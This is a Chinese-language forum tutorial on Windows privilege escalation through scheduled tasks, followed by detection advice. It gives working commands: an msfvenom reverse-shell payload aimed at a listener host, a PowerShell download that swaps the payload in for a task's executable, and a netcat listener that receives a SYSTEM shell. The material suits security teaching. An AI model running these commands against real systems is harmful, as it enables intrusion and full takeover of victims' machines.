
![](https://bbs.kanxue.com/upload/attach/202112/767964_2HQ8ZTM2N3YP65G.jpg)

步骤1:浏览任务计划程序库以创建任务。

![](https://bbs.kanxue.com/upload/attach/202112/767964_PPUWWG4FRBZN3WS.jpg)

步骤2：为登录的用户分配一个任务，以最高权限执行。

![](https://bbs.kanxue.com/upload/attach/202112/767964_G54DFT7JHE9JZED.jpg)

步骤3：选择 "触发器 "选项来启动一个预定任务/工作。

![](https://bbs.kanxue.com/upload/attach/202112/767964_T4KVW3SXU5P64WS.jpg)

步骤4：在这里，我们已经安排了任务的复发发生。

![](https://bbs.kanxue.com/upload/attach/202112/767964_T9KN3Q9E9ESKZ4A.jpg)

步骤5：当你创建一个任务时，你必须指定任务开始时将发生的操作。

![](https://bbs.kanxue.com/upload/attach/202112/767964_3CV8V3P9TMEZPBG.jpg)

步骤6：指定一个计划任务要执行的行动类型。例如，通过一些可执行程序安排系统的备份。

![](https://bbs.kanxue.com/upload/attach/202112/767964_6C7R7F4HF373MZD.jpg)

下面的示例目录为：Imp Jobs

步骤7：这样，计划任务将在每天的特定时间被触发，以进行备份或计划工作，定义为操作。

步骤8:攻击者可以通过利用计划任务/作业来提升权限。有了初步的立足点后，我们可以查询以获取计划任务的列表。

```
schtasks /query /fo LIST /V
```

英文：

![](https://bbs.kanxue.com/upload/attach/202112/767964_76BQ7ZGHEHVBGMG.jpg)

中文：

![](https://bbs.kanxue.com/upload/attach/202112/767964_J6UHURSZJ5X83QZ.jpg)

这有助于攻击者了解哪个应用程序在什么时间连接执行。

![](https://bbs.kanxue.com/upload/attach/202112/767964_5FRCY5FKZER28VK.jpg)

为了获得一个作为NT权限SYSTEM的反向shell，让我们创建一个恶意的exe文件，通过计划任务执行。使用`Msfvenom`，我们已经创建了一个被注入目标系统的exe文件。

```
msfvenom -p windows/shell_reverse_tcp lhost=192.168.1.3 lport=8888 -f exe > shell.exe
```

![](https://bbs.kanxue.com/upload/attach/202112/767964_YYB9DMJJ7Z7TR6V.jpg)

为了滥用计划的任务，攻击者要么通过覆盖来修改应用程序，要么用副本替换原始文件。为了在同一个目录中插入一个重复的文件，我们将原始文件重命名为`file.bak`。

![](https://bbs.kanxue.com/upload/attach/202112/767964_N9XPTB2YE7RZYK7.jpg)

然后在`wget`命令的帮助下在同一个目录下下载了恶意的`file.exe`

```
powershell wget 192.168.1.3/shell.exe –o file.exe
```

![](https://bbs.kanxue.com/upload/attach/202112/767964_4R6H3YMT2ZY4CN5.jpg)

一旦重复的`file.exe`被注入到同一目录中，那么，`file.exe`将通过任务计划程序自动执行。由于攻击者确保`netcat`监听器必须处于监听模式，以获得特权shell的反向连接。

```
nc -lvp 8888

whoami /priv
```

![](https://bbs.kanxue.com/upload/attach/202112/767964_E3GP2RQ7V7BW27K.jpg)

# 检测

- Sysinternals Autoruns等工具可以检测系统的变化，如显示目前预定的工作。

- 像TCPView & Process Explore这样的工具可以帮助识别可疑服务或进程的远程连接。

- 查看任务属性和历史。通过使用命令行来查看任务的属性和历史记录

  ```
  Schtasks /Query /FO LIST /V
  ```

- 启用事件日志服务内的 `Microsoft-Windows-TaskScheduler/Operational` 配置，以报告计划任务的创建和更新。

- Task Scheduler应用程序中的调整实际上仅控制某个事件日志的启用状态，因此您可以通过Windows命令行等效地调整Task Scheduler的“历史记录”模式：

  ```
  wevtutil set-log Microsoft-Windows-TaskScheduler/Operational /enabled:true
  ```

  要检查当前状态：

  ```
  wevtutil get-log Microsoft-Windows-TaskScheduler/Operational
  ```

  对于不喜欢按键的操作，以下是上述内容的略微缩写形式：

  ```
  wevtutil sl Microsoft-Windows-TaskScheduler/Operational /e:true

  wevtutil gl Microsoft-Windows-TaskScheduler/Operational
  ```

- 示例图![](https://bbs.kanxue.com/upload/attach/202112/767964_HW5M5Q4TPNGNWFC.jpg)

测试监控

连接时数据

![](https://bbs.huorong.cn/data/attachment/forum/202210/22/132204xgqgonpz44gffepp.jpg)

相关协议

![](https://bbs.kanxue.com/upload/attach/202210/767964_SYEYBR6F3B99UHP.jpg)

执行命令

![](https://bbs.kanxue.com/upload/attach/202210/767964_WMMDWNWYMS2EGHP.jpg)

`exit`退出断开连接

![](https://bbs.kanxue.com/upload/attach/202210/767964_CXK9YSTRPFYJDG5.jpg)

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)

最后于  2022-10-22 13:54 被梦幻的彼岸编辑，原因：
